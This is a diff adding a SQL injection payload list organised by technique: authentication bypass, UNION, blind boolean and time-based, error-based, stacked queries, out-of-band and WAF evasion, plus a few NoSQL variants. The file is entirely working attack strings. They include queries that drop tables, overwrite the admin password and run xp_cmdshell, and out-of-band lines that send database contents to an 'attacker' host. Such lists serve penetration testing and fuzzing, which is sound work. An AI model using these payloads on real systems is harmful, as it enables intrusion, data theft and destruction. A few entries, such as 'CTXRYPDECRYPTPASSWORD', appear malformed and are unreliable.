@@ -1,0 +1,122 @@
+# ===== SQL Injection Payload List =====
+# Categories: Auth bypass, UNION-based, Boolean-based, Error-based, Time-based, Stacked, WAF evasion
+
+# --- Authentication Bypass ---
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1 --
+' OR 1=1#
+' OR '1'='1' LIMIT 1 --
+" OR "1"="1
+" OR 1=1 --
+' OR ''='
+' OR 1=1 LIMIT 1;#
+admin' --
+admin' #
+') OR ('1'='1
+') OR ('1'='1') --
+')) OR (('1'='1
+'=' 'or'='
+1' OR '1'='1'-- -
+-1' OR 1=1; -- -
+
+# --- UNION-based ---
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT 1,2,3,4,5 --
+' UNION ALL SELECT NULL,NULL,NULL --
+' UNION SELECT username,password FROM users --
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT @@version,NULL --
+' UNION SELECT version(),database() --
+-1 UNION SELECT 1,2,3 --
+' UNION SELECT SQLite_version(),NULL --
+
+# --- Boolean-based (blind) ---
+' AND 1=1 --
+' AND 1=2 --
+' AND 'a'='a
+' AND 'a'='b
+' OR EXISTS(SELECT 1) --
+' AND (SELECT COUNT(*) FROM users)>0 --
+' AND SUBSTRING(database(),1,1)='a' --
+' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64 --
+1' AND (SELECT 1)=1 --
+' AND LENGTH(database())>1 --
+
+# --- Error-based ---
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) --
+' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8))) --
+' AND GTID_SUBSET((SELECT @@version),1) --
+' OR 1=1/0 --
+' AND CTXRYPDECRYPTPASSWORD --
+'||(SELECT dbms_xmlgen.getxml(''||username||'' FROM users))||'  -- Oracle
+' AND 1=CONVERT(int,@@version) --   -- MSSQL
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --
+
+# --- Time-based (blind) ---
+' AND SLEEP(5) --
+' AND SLEEP(5) #
+'; WAITFOR DELAY '0:0:5' --     -- MSSQL
+' || pg_sleep(5) --             -- PostgreSQL
+' AND (SELECT pg_sleep(5)) IS NOT NULL --
+'; SELECT pg_sleep(5) --
+' AND [IF(1=1,SLEEP(5),0)] --
+' AND BENCHMARK(5000000,MD5('a')) --
+'||(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END)||'  -- Oracle
+' AND 1=(SELECT 1 FROM pg_sleep(5)) --
+
+# --- Stacked queries ---
+'; SELECT 1 --
+'; DROP TABLE test --
+'; INSERT INTO users VALUES ('evil','pass') --
+'; UPDATE users SET password='pwned' WHERE username='admin' --
+'; SELECT pg_sleep(5) --
+'; EXEC xp_cmdshell('dir') --     -- MSSQL (if enabled)
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --
+
+# --- Out-of-band (OOB) ---
+'; EXEC master..xp_dirtree '\\attacker\share' --   -- MSSQL DNS exfil
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker/'||database()),NULL FROM dual --  -- Oracle
+' UNION SELECT HTTPGET('http://attacker/'),NULL --
+
+# --- Inline / WAF evasion ---
+'/**/OR/**/1=1--
+'/*!OR*/1=1--
+' %OR 1=1 --
+'+OR+1=1--
+'%20OR%201=1--
+' or 1=1 or 'a'='a
+' oR 1=1 --
+' Or 1=1 --
+' %4fR 1=1 --
+' unION seLECT 1,2,3 --
+%27%20OR%20%271%27%3D%271
+' UNI%4fN SELECT NULL--
+' AND (1=1) UNION SELECT NULL--
+sELect/**/*/**/fROm/**/users--
+' OR '1'='1' -- comment
+' AND 0x31=0x31 --
+' OR CHAR(49)=CHAR(49) --
+' OR 1 IN (1) --
+' OR 1=1)-- -
+' -- -
+' #
+' /*
+%00' OR 1=1 --
+' OR 1=1;%00
+
+# --- NoSQL / other variants (bonus) ---
+' || '1'=='1
+{"$gt":""}
+[$ne]=1
+' || true
